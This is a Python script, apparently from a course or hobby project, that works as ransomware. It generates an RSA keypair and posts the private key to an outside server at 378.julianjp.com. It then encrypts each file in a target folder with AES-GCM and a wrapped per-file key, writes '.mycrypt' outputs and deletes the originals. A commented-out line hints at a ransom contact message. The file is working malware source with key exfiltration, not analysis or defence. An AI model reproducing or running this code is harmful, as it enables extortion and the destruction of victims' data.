import os
import sys
import json
import base64

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes
)
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization

from os import listdir
from os.path import isfile, join

import requests

def Myencrypt(plaintext, key):
  iv_length = 16
  iv = os.urandom(iv_length)

  encryptor = Cipher(
      algorithms.AES(key),
      modes.GCM(iv),
      backend=default_backend()
  ).encryptor()

  ciphertext = encryptor.update(plaintext) + encryptor.finalize()

  return (iv, ciphertext, encryptor.tag)
    
def MyfileEncrypt(filepath):
  key_length = 32
  key = os.urandom(key_length)
  
  file_name = os.path.splitext(filepath)[0]
  file_extension = os.path.splitext(filepath)[1]

  with open(filepath, "rb") as binary_file:
    # Read the whole file at once
    data = binary_file.read()
    iv, ciphertext, tag = Myencrypt(
      data,
      key
    )
    
    return (ciphertext, tag, iv, key, file_extension)

def MyRSAEncrypt(filepath, rsa_pub_path):
  ciphertext, tag, iv, key, file_extension = MyfileEncrypt(filepath)
  
  # Written in collaboration with @ChrisMeyer7088
  with open(rsa_pub_path, 'rb') as pub_file:
    # pub = serialization.load_ssh_public_key(
    #   pub_file.read(),
    #   backend=default_backend()
    # )
    pub = serialization.load_pem_public_key(
      pub_file.read(),
      backend=default_backend()
    )
    # print(pub_file.read())
    # pub = serialization.load_pem_public_key(pub_file.read(), default_backend())
    # print(pub)
    pub_file.close()
    key_encby_rsa = pub.encrypt(
      key,
      padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA1()),
        algorithm=hashes.SHA1(),
        label=None
      )
    )
    
    return (ciphertext, tag, iv, key_encby_rsa, file_extension)
  

def encrypt_file(filepath, rsa_pub_path):
  file_name = os.path.splitext(filepath)[0]
  
  ciphertext, tag, iv, key_encby_rsa, file_extension = MyRSAEncrypt(filepath, rsa_pub_path)
  
  data = {}
  
  data['ciphertext_base64'] = base64.b64encode(ciphertext).decode('utf-8')
  data['tag'] = base64.b64encode(tag).decode('utf-8')
  data['iv'] = base64.b64encode(iv).decode('utf-8')
  data['file_extension'] = file_extension
  
   # Using 'RSACipher' as key value to ensure compatibility with @ChrisMeyer7088's version
  data['RSACipher'] = base64.b64encode(key_encby_rsa).decode('utf-8')
  
  output_filename = file_name + '.mycrypt'
  
  with open(output_filename, 'w') as outfile:  
    outfile.write(json.dumps(data))
  
    return output_filename
    
def generate_rsa_keyfile():
  # Generate private
  private_raw = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
  )
  private = private_raw.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption()
  )
  
  # Obtain public from private
  public_raw = private_raw.public_key()
  public = public_raw.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
  )
  
  private_name = ''
  public_name = ''
  payload = {
    'pem': private,
    'pub': public
  }
  r = requests.post('https://378.julianjp.com/encrypt', data=payload)
  # print("Contact us - Your identifier is ", r.text)
  with open("/tmp/hax_rsa.pub", 'wb') as file:
    file.write(public)
    public_name = file.name
    
  return (os.path.realpath(public_name), os.path.realpath(private_name))

## UI
# filepath = sys.argv[sys.argv.index('--encrypt') + 1]
filepath = './encdir/'
# keypath = sys.argv[sys.argv.index('--key') + 1]
pub_path, priv_path = generate_rsa_keyfile()
# print(pub_path)

filenames = [f for f in listdir(filepath) if isfile(join(filepath, f))]
for file in filenames:
  output_filename = encrypt_file(os.path.join(filepath, file), pub_path)

  os.remove(filepath + file)
  
# Based from for encrypt() and decrypt() methods taken from https://cryptography.io/en/latest/hazmat/primitives/symmetric-encryption/
